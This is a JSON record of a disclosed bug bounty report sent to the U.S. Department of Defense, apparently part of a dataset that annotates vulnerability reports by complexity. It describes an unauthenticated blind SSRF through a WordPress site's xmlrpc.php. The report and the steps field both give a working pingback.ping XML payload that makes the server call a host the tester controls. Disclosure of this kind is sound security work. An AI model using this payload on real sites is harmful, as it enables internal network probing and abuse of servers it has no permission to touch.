{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "0r10nh4ck ",
    "title": "Unauthenticated Blind SSRF at https://\u2588\u2588\u2588\u2588\u2588 via xmlrpc.php file",
    "content": "\nDescription:\nHi team,\nI would like to report a security vulnerability I discovered on your website. I was able to perform Server-Side Request Forgery (SSRF) attacks via the xmlrpc.php file at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 endpoint.\nUsing a simple POST request to the xmlrpc.php endpoint, I was able to bypass input validation and send a request to an external URL.\nI have attached a proof of concept (PoC) script that demonstrates this vulnerability. It sends a request to my VPS server using interact.sh client (https://github.com/projectdiscovery/interactsh), but an attacker could use this technique to send requests to any URL of their choosing.\nReferences\nhttps://www.sonarsource.com/blog/wordpress-core-unauthenticated-blind-ssrf/\nhttps://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/\nImpact\nThe vulnerability could be used to conduct further attacks, such as accessing internal systems or exfiltrating sensitive data.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nStart a server in vps using interact.sh or use burpsuite collaborator.\nGo to: https://\u2588\u2588\u2588/xmlrpc.php\nSee the response:\nCode 42 Bytes\n1XML-RPC server accepts POST requests only.\nGo to burpsuite and send this request to the repeater.\nChange the request method to POST.\nGet the URL of your server listener and set this payload at request:\nCode 256 Bytes\n1<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n2<methodCall>\n3<methodName>pingback.ping</methodName>\n4<params>\n5<param>\n6<value><string>https://your server</string></value>\n7</param>\n8<param>\n9<value><string>https://\u2588\u2588\u2588\u2588\u2588/</string></value>\n10</param>\n11</params>\n12</methodCall>\nSend the POST request.\nSee the response in your server log.\nSuggested Mitigation/Remediation Actions\nI would recommend implementing input validation and filtering to prevent these types of attacks in the future. Please let me know if you require any additional information or if you have any questions.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Server-Side Request Forgery (SSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1681507380,
    "report_url": "https://hackerone.com/reports/1890719",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Start a server using interact.sh or Burp Suite collaborator to listen for incoming requests."
        ],
        [
            2,
            "Send a POST request to https://\u2588\u2588\u2588\u2588\u2588/xmlrpc.php with the following XML payload:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n<methodName>pingback.ping</methodName>\n<params>\n<param>\n<value><string>https://your-server</string></value>\n</param>\n<param>\n<value><string>https://\u2588\u2588\u2588\u2588\u2588/</string></value>\n</param>\n</params>\n</methodCall>"
        ],
        [
            3,
            "Observe the incoming request on your server, confirming the SSRF vulnerability."
        ]
    ],
    "vuln_description": "An unauthenticated blind Server-Side Request Forgery (SSRF) vulnerability exists in the xmlrpc.php file of the target website. By sending a crafted XML payload to the xmlrpc.php endpoint, an attacker can force the server to make arbitrary HTTP requests to external or internal systems, potentially leading to further exploitation such as data exfiltration or internal network reconnaissance.",
    "reason": "The vulnerability involves a straightforward exploitation of a known issue in WordPress's XML-RPC interface, specifically the pingback.ping method. The attack does not require complex interactions or state manipulation, and the exploitation steps are well-documented in public resources.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}